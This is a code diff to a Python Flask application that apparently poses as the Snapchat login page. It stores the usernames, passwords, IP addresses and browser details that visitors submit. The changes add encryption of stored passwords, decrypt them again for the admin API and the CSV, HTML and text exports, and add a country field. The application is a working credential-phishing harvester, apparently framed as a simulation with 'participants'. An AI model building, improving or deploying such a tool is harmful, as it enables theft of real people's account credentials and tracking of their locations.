@@ -20,12 +20,14 @@ from urllib.parse import urljoin, urlparse
 from io import StringIO
 import requests
 from flask import Flask, request, render_template, redirect, url_for, jsonify, session
+import base64
+from cryptography.fernet import Fernet
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 CONFIG = {
     "SNAPCHAT_LOGIN_URL": "https://accounts.snapchat.com/login",
     "SERVER_PORT": 8080,
-    "USE_HTTPS": False,
+    "USE_HTTPS": True,
     "CAPTURE_DB": os.path.join(BASE_DIR, "captured_credentials.db"),
     "SESSION_TTL_MINUTES": 60,
     "RANDOMIZE_DOMAINS": True,
@@ -204,25 +206,26 @@ def geoip(ip):
     GEOIP_CACHE[ip] = 'Unknown'
     return 'Unknown'
 
-def capture_credentials(participant_id, username, password, session_token=None):
-    conn = sqlite3.connect(CONFIG["CAPTURE_DB"])
-    c = conn.cursor()
-    ip_address = request.remote_addr
-    user_agent = request.headers.get('User-Agent', 'Unknown')
-    c.execute('''
-        INSERT INTO captured_credentials 
-        (participant_id, username, password, ip_address, user_agent, session_token)
-        VALUES (?, ?, ?, ?, ?, ?)
-    ''', (participant_id, username, password, ip_address, user_agent, session_token))
-    conn.commit()
-    conn.close()
-    log_event("CAPTURE", participant_id, {
-        "username_length": len(username),
-        "password_length": len(password),
-        "ip": ip_address,
-        "ua": user_agent
-    })
-    return True
+
+def _get_fernet():
+    key = base64.urlsafe_b64encode(hashlib.sha256(CONFIG["ADMIN_KEY"].encode()).digest())
+    return Fernet(key)
+
+def encrypt_password(password):
+    if not password:
+        return password
+    try:
+        return _get_fernet().encrypt(password.encode()).decode()
+    except:
+        return password
+
+def decrypt_password(encrypted):
+    if not encrypted:
+        return encrypted
+    try:
+        return _get_fernet().decrypt(encrypted.encode()).decode()
+    except:
+        return encrypted
 
 
 @app.before_request
@@ -366,7 +369,7 @@ def handle_login():
             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
         ''', (participant_id,
               username or json.dumps(all_fields),
-              password or '',
+              encrypt_password(password or ''),
               request.remote_addr,
               request.headers.get('User-Agent', 'Unknown'),
               None,
@@ -495,7 +498,7 @@ def api_captures():
     conn.close()
     return jsonify([{
         "id": r[0], "participant_id": r[1], "username": r[2],
-        "password": r[3] or "",
+        "password": decrypt_password(r[3] or ""),
         "ip_address": r[4], "ip": r[4],
         "user_agent": r[5][:80] if r[5] else "",
         "timestamp": r[6],
@@ -551,7 +554,7 @@ def api_capture():
              time_on_page, referrer, click_count, step, notes, country)
             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
             (
-                participant_id, username, password, ip, ua,
+                participant_id, username, encrypt_password(password), ip, ua,
                 data.get('screen_resolution', ''),
                 data.get('timezone', ''),
                 data.get('browser_language', ''),
@@ -857,7 +860,7 @@ def export_csv():
     rows = conn.execute("""
         SELECT participant_id, username, password, ip_address, user_agent,
                timestamp, screen_resolution, timezone, browser_language,
-               platform, click_count, referrer
+               platform, click_count, referrer, country
         FROM captured_credentials ORDER BY id DESC
     """).fetchall()
     conn.close()
@@ -865,9 +868,11 @@ def export_csv():
     cw = csv.writer(si)
     cw.writerow(["participant_id", "username", "password", "ip", "user_agent",
                   "timestamp", "screen", "timezone", "lang", "platform",
-                  "clicks", "referrer"])
+                  "clicks", "referrer", "country"])
     for r in rows:
-        cw.writerow(r)
+        decrypted = list(r)
+        decrypted[2] = decrypt_password(r[2])
+        cw.writerow(decrypted)
     output = si.getvalue()
     return output, 200, {"Content-Type": "text/csv; charset=utf-8",
                          "Content-Disposition": "attachment; filename=captures.csv"}
@@ -885,21 +890,22 @@ def export_report():
     rows = conn.execute("""
         SELECT participant_id, username, password, ip_address, user_agent,
                timestamp, screen_resolution, timezone, browser_language,
-               platform, click_count, referrer
+               platform, click_count, referrer, country
         FROM captured_credentials ORDER BY id DESC
     """).fetchall()
     conn.close()
 
     html_rows = ""
     for i, r in enumerate(rows, 1):
-        pw_display = (r[2][:3] + "***") if r[2] else ""
+        pw_display = (decrypt_password(r[2])[:3] + "***") if r[2] else ""
         ua_short = (r[4] or "")[:30]
         ref_short = (r[11] or "")[:30]
         html_rows += (
             f"<tr><td>{i}</td><td>{r[1]}</td><td>{pw_display}</td>"
             f"<td>{r[3]}</td><td>{ua_short}</td><td>{r[5]}</td>"
             f"<td>{r[6] or ''}</td><td>{r[7] or ''}</td><td>{r[8] or ''}</td>"
-            f"<td>{r[9] or ''}</td><td>{r[10] or 0}</td><td>{ref_short}</td></tr>"
+            f"<td>{r[9] or ''}</td><td>{r[10] or 0}</td><td>{ref_short}</td>"
+            f"<td>{r[12] or ''}</td></tr>"
         )
 
     html = f"""<!DOCTYPE html>
@@ -928,7 +934,7 @@ def export_report():
   <div class="card"><h2>SESSIONS</h2><p>{sessions}</p></div>
 </div>
 <table>
-<tr><th>#</th><th>Participant</th><th>Password</th><th>IP</th><th>UA</th><th>Timestamp</th><th>Screen</th><th>Timezone</th><th>Lang</th><th>Platform</th><th>Clicks</th><th>Referrer</th></tr>
+<tr><th>#</th><th>Participant</th><th>Password</th><th>IP</th><th>UA</th><th>Timestamp</th><th>Screen</th><th>Timezone</th><th>Lang</th><th>Platform</th><th>Clicks</th><th>Referrer</th><th>Country</th></tr>
 {html_rows}
 </table>
 </body>
@@ -959,7 +965,7 @@ def export_txt():
     lines.append("-" * 60)
     lines.append("")
     for r in rows:
-        pw = r[3] if r[3] else "-"
+        pw = decrypt_password(r[3]) if r[3] else "-"
         country = f" [{r[7]}]" if r[7] else ""
         lines.append(f"  #{r[0]} [{r[6] or 'login'}] {r[2] or '-'}")
         lines.append(f"      IP: {r[4]}{country}  |  PW: {pw}")
@@ -976,7 +982,7 @@ def generate_qr():
     forbid = require_admin()
     if forbid:
         return forbid
-    url = request.args.get('url', 'http://localhost:5000')
+    url = request.args.get('url', f'http://localhost:{CONFIG["SERVER_PORT"]}')
     try:
         import qrcode
         img = qrcode.make(url)
